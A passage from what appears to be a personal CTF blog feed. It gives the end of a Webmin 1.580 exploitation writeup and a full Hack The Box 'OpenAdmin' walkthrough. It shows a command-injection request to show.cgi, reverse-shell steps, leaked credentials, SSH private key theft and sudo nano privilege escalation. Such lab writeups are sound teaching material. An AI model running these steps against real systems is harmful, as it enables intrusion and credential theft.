&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;-f&lt;/code&gt; flag tells the connection to run in the background, and the &lt;code&gt;-N&lt;/code&gt; flag is required with that to tell SSH that no command execution is required (as it is typically expected).&lt;/p&gt;
&lt;p&gt;Initially, to confirm what the port is for, I ran nmap against it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # nmap -sC -sV -p 10000 -Pn 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 06:33 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: MiniServ/1.580
|_http-title: Login to Webmin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And visiting it in a browser confirms that its a web accessible console named &lt;code&gt;webmin&lt;/code&gt; - taking a wild guess via our SSH access to the box (since &lt;code&gt;locate&lt;/code&gt; didn&amp;rsquo;t find anything) I tried &lt;code&gt;/etc/webmin&lt;/code&gt; and found most of the files for that service. The majority were unreadable and owned by root but one of them, a file named &lt;code&gt;version&lt;/code&gt; was not:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;agent47@gamezone:/etc/webmin$ cat version
1.580
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we run this through exploit DB, we will see that there&amp;rsquo;s a metasploit module available to exploit this specific version of webmin:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Webmin 1.580 - &amp;lsquo;/file/show.cgi&amp;rsquo; Remote Command Execution (Metasploit)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we load that up we can see that it&amp;rsquo;s sending encoded payloads via an authenticated session. This leverages a vulnerability in the services show.cgi component allowing an attacker to run commands with root privilages. We first need credentials though - I initialy tried hydra against the form but got myself banned rather quickly, then I stopped being stupid and tried our existing creds for Agent47 and they do work.&lt;/p&gt;
&lt;p&gt;The correct metasploit module is &lt;code&gt;exploit/unix/webapp/webmin_show_cgi_exec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If we send the module through our burp proxy by running:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set PROXIES http:127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can follow the chain of events for the most part - its a little more complicated as the payload, in this case, is another metasploit module thats encoded and uploaded via the FileManager functionality in Webmin. Effectively it uploads a file and then executes that via &lt;code&gt;sh&lt;/code&gt; - the default payload is &lt;code&gt;cmd/unix/reverse_perl&lt;/code&gt; and this basically consists of a Perl command that will intiiate a reverse shell. This gets dumped into a file thats named using a random set of characters/numbers and then called in the following manner:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /file/show.cgi/bin/UP8Qmwh|sh -c
Host: 127.0.0.1:10000
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: sid=e6b8f4f5ff9b17ac77529c6e91c88667
Content-Type: application/x-www-form-urlencoded
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming the file exists and the payload is correct, it&amp;rsquo;ll get executed. I may see if I can supply a manual payload at a later date, for now though Metasploit is the easiest way to handle this.&lt;/p&gt;
&lt;p&gt;This gets you a shell, though, and as the root user non-the-less. From there you can proceed to get the flag.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;All in all, this is a guided room so the difficulty curve will only go so far. In this case, we tried to take it a step further by manual exlpoitation of SQL. Wherever possible, and in line with expectations for the OSCP, I try and refrain from using SQLMap and Metasploit as much as possible. They are one-time/limited use tools in the OSCP exam so becoming reliant on them instead of your own knowledge isn&amp;rsquo;t going to be favorable in the long term. Hopefully this better explains exactly how this is done, as well as detailing how SQLMap itself handle this. In the last stage, manual exploitation wasn&amp;rsquo;t something I dug into due to time but &lt;a href=&#34;http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 URL is referenced within the Metasploit module and outlines, in more detail, how that works.&lt;/p&gt;
&lt;p&gt;None-the-less, this is a great learning experience for anyone that hasn&amp;rsquo;t manually exploited SQLi to this degree before. I hope you enjoyed the read.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>OpenAdmin [Easy] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/openadmin/</link>
      <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/openadmin/</guid>
      <description>Overview OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.
 NMAP Scan Let&amp;rsquo;s begin by seeing what ports are currently open:</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/openadmin.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;OpenAdmin was a quick and easy Linux box that uses a common CVE for an application called ONA to get us intial access to the box. From there, we hop between 2 user through some enumeration before exploiting a sudo command to get root.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s begin by seeing what ports are currently open:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jan  4 19:56:44 2020 as: nmap -v -A -oA nmap/openadmin_initial 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=38593%PV=Y%DS=2%DC=T%G=Y%TM=5E10EE11
OS:%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 34.527 days (since Sun Dec  1 07:18:22 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   42.44 ms 10.10.14.
2   42.49 ms 10.10.10.171

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  4 19:57:05 2020 -- 1 IP address (1 host up) scanned in 21.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;In a nutshell, we can see two open ports. Since SSH is up to date and we can&amp;rsquo;t directly compromise it, let&amp;rsquo;s move our attention to the web port. I did an initial Gobuster scan on the IP that also targeted HTML/PHP files  - this found 2 more sub-dir websites:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/music&lt;/code&gt; and &lt;code&gt;/sierra&lt;/code&gt; seem to be independant sites, neither with anything too interesting present. That said, one of them (/music) had a link to login that points here:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And this is vulnerable to a certain exploit:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;OpenNetAdmin 18.1.1 - Remote Code Execution&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This script requires dos2unix running on it prior to use because of weird character breaks etc but it works as intended out the box. I hijacked an existing reverse-shell script on the server, replacing the port and my IP with sed. Also opened up 9001 on the firewall as its locked down by default. Running the script via the browser got me a rev shell:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/bash ./47691.sh 10.10.10.171/ona/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Once on the box I had a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file and found the following 2 users with shell access, aside from root:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Jimmy&lt;/li&gt;
&lt;li&gt;Joanna&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then ran linpeas as the www-data user. Most of the interesting stuff appears to to be in the ONA (OpenNetAdmin) dir, i.e. /opt/ona. In here we got some DB creds:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;database_settings.inc.php&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$ona_contexts=array (
  &#39;DEFAULT&#39; =&amp;gt;
  array (
    &#39;databases&#39; =&amp;gt;
    array (
      0 =&amp;gt;
      array (
        &#39;db_type&#39; =&amp;gt; &#39;mysqli&#39;,
        &#39;db_host&#39; =&amp;gt; &#39;localhost&#39;,
        &#39;db_login&#39; =&amp;gt; &#39;ona_sys&#39;,
        &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,
        &#39;db_database&#39; =&amp;gt; &#39;ona_default&#39;,
        &#39;db_debug&#39; =&amp;gt; false,
      ),
    ),
    &#39;description&#39; =&amp;gt; &#39;Default data context&#39;,
    &#39;context_color&#39; =&amp;gt; &#39;#D3DBFF&#39;,
  ),
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Testing this pass with one of the 2 available users; we get access as &lt;em&gt;Jimmy&lt;/em&gt;. I also tried as the Joanna user but that failed. So we have one login:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;jimmy:n1nj4W4rri0R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Theres a folder named &lt;code&gt;internal&lt;/code&gt; within &lt;code&gt;/var/www&lt;/code&gt; and its owned by Jimmy - only he and the &lt;code&gt;internal&lt;/code&gt; group can access it so www-data cannot. Theres also a few PHP pages in here - they can be viewed directly by running a PHP server:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;php -S [ip:port]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Viewing this you can see that it&amp;rsquo;s a login page that takes you to a page containing a &lt;code&gt;shell_exec&lt;/code&gt; statement. The code itself thankfully contians the password to get past the login form: &lt;code&gt;Revealed&lt;/code&gt; - this was a SHA-512 hash that I cracked via hashes.org.  For testing I also did this via JTR on the my new, totally original, not-ippsec-inspired-what-so-ever, kracken rig:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kracken:~/hashes/htb/openadmin# john --show --format=Raw-SHA512 hash
jimmy:Revealed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The problem with the exec statement is that it runs as as the user thats running the file, i.e. Jimmy, so I couldn&amp;rsquo;t initially see how I&amp;rsquo;d be able to leverage it. Even more annoyingly the default exec command is a cat request to Joanna&amp;rsquo;s id_rsa file, so it&amp;rsquo;s like a double taunt.&lt;/p&gt;
&lt;p&gt;Digging further, I eventually noticed that the internal group shares both Jimmy and Joanna as common members:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:/home$ cat /etc/group | grep -i internal
internal:x:1002:jimmy,joanna
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at listening ports on the machine we can also see something else interesting:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy@openadmin:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:52846               :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A unique local port (52846) is listening - curling it from the machine shows a page very similar to the one mentoned above in the internal folder. The problem is we cant access that port from our side to view the page via something like firefox. Except we can, using SSH port forwarding of course. I did this in the following manner:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Login to the box via the usual means.&lt;/li&gt;
&lt;li&gt;On a brand new line press: &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;~&lt;/code&gt; + &lt;code&gt;C&lt;/code&gt; to drop into an interactive SSH prompt.&lt;/li&gt;
&lt;li&gt;Forward in the following manner:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;-L 9001:127.0.0.1:52846&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Alternatively, if I&amp;rsquo;ve fluffed that up on the writeup, you can also do it in the following single line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 9001:127.0.0.1:52846 -f -N jimmy@10.10.10.171&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This basically says that the client (i.e ME) will listen (-L) on port 9001, and SSH will tunnel those connections from 127.0.0.1, port 52846 - which is what we want as per the netstat. The full SSH command includes 2 additional flags - &lt;code&gt;-f&lt;/code&gt; backgrounds the request so you don&amp;rsquo;t see any output and &lt;code&gt;-N&lt;/code&gt; tells SSH that no commands are to be run - both of these make it so you can seamlessly forward the port to your machine without any output or interaction besides the orignial command.&lt;/p&gt;
&lt;p&gt;Viewing the page on the forwarded port, we see something interesting. It runs the EXACT same exec code that we see in the &lt;code&gt;internal&lt;/code&gt; directory only this time it runs it as Joanna - meaning we can actually cat the contents of the id_rsa file in her home folder. Result.&lt;/p&gt;
&lt;p&gt;Once I had the RSA key we used SSH2John to convert it to a format john was happy with and then passed it to the kracken which got us the passphrase: &lt;code&gt;bloodninjas&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Got in as Joanna. Got the user flag. Boom.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Root was unbelievably easy compared to the user steps.&lt;/p&gt;
&lt;p&gt;I ran linPeas but it wasn&amp;rsquo;t really necessary; doing standard enum is enough. So I ran:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And found out Joanna had sudo access to the following command without a password:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo /bin/nano /opt/priv&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It was purely a case of running that exact command along with &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
 from GTFOBins:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Done! :)&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
